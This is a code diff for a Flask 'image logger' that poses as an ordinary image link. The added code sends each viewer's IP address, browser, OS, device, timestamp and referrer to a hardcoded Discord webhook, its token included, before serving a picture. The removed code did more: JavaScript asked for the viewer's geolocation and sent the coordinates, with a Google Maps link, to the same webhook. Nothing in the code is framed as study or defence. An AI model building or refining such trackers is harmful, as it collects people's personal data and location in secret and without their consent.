@@ -8,6 +8,14 @@ app = Flask(__name__)
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518983533526257777/LoIZ6BCnbo1pvKd2Yj0gmOzo-AZfpwSLergw8OmHtfNNgLB6N7bmJ2ahgOwi_m9kN9Q-"
 IMAGE_URL = "https://i.pinimg.com/236x/6a/3d/33/6a3d336840b6a2d91efde0ff77f038e9.jpg"
 
+def fetch_image():
+    try:
+        r = requests.get(IMAGE_URL, timeout=10)
+        r.raise_for_status()
+        return r.content, r.headers.get('Content-Type', 'image/jpeg')
+    except:
+        return b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;', 'image/gif'
+
 @app.route('/api/image', methods=['GET'])
 def serve_image():
     ip = request.remote_addr or request.headers.get('X-Forwarded-For', 'Unknown')
@@ -23,84 +31,38 @@ def serve_image():
     except:
         browser = os_name = device = "Unknown"
 
-    # HTML with JS geolocation - properly escaped
-    html = """<!DOCTYPE html>
-<html>
-<head>
-    <title></title>
-    <style>body { margin:0; background:black; overflow:hidden; }</style>
-</head>
-<body>
-    <img src="{}" style="max-width:100%; height:auto;" alt="">
-    <script>
-        const webhook = "{}";
-        const ip = "{}";
-        const browser = "{}";
-        const os = "{}";
-        const device = "{}";
-        const timestamp = "{}";
-        const referrer = "{}";
+    # Rich embed with emojis
+    embed = {
+        "title": "🔥 Image Logger Triggered",
+        "color": 0xff00ff,
+        "description": "🖼️ Image viewed successfully",
+        "thumbnail": {"url": IMAGE_URL},
+        "fields": [
+            {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
+            {"name": "🔍 Browser", "value": f"`{browser}`", "inline": True},
+            {"name": "💻 OS / Device", "value": f"`{os_name} - {device}`", "inline": True},
+            {"name": "⏰ Timestamp", "value": timestamp, "inline": False},
+            {"name": "🔗 Referrer", "value": f"`{referrer}`", "inline": False},
+            {"name": "📌 Note", "value": "Location permission requires browser JS. Pure image mode active.", "inline": False}
+        ],
+        "footer": {"text": "Image Logger • Vercel"}
+    }
 
-        function sendLocation(lat, lon) {
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            const payload = {
-                content: "**🧭 Location Captured!**",
-                embeds: [{
-                    title: "🔥 Image Logger + Location",
-                    color: 0xff00ff,
-                    description: "User allowed location access",
-                    thumbnail: { url: "https://i.pinimg.com/236x/6a/3d/33/6a3d336840b6a2d91efde0ff77f038e9.jpg" },
-                    fields: [
-                        { name: "📍 Latitude", value: "`" + lat + "`", inline: true },
-                        { name: "📍 Longitude", value: "`" + lon + "`", inline: true },
-                        { name: "🗺️ Google Maps", value: "[Click to View Location](" + mapsLink + ")", inline: false },
-                        { name: "🌐 IP", value: "`" + ip + "`", inline: true },
-                        { name: "🔍 Browser", value: "`" + browser + "`", inline: true },
-                        { name: "💻 OS/Device", value: "`" + os + " - " + device + "`", inline: true },
-                        { name: "⏰ Time", value: timestamp, inline: false },
-                        { name: "🔗 Referrer", value: "`" + referrer + "`", inline: false }
-                    ],
-                    footer: { text: "Image Logger • Powered by Vercel" }
-                }]
-            };
-            fetch(webhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
-        }
+    payload = {
+        "content": "**🔔 New Image View Detected**",
+        "embeds": [embed]
+    }
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude),
-                () => {
-                    // Permission denied fallback
-                    fetch(webhook, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            content: "**📸 Image Viewed (No Location)**",
-                            embeds: [{
-                                title: "Basic View",
-                                color: 0xffff00,
-                                fields: [
-                                    {name: "IP", value: "`" + ip + "`"},
-                                    {name: "Browser", value: "`" + browser + "`"},
-                                    {name: "Time", value: timestamp}
-                                ]
-                            }]
-                        })
-                    });
-                }
-            );
-        }
-    </script>
-</body>
-</html>""".format(IMAGE_URL, DISCORD_WEBHOOK, ip, browser, os_name, device, timestamp, referrer)
+    try:
+        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
+    except:
+        pass
 
-    response = make_response(html)
-    response.headers.set('Content-Type', 'text/html')
+    image_data, content_type = fetch_image()
+    response = make_response(image_data)
+    response.headers.set('Content-Type', content_type)
     response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
+    response.headers.set('Pragma', 'no-cache')
     return response
 
 if __name__ == '__main__':
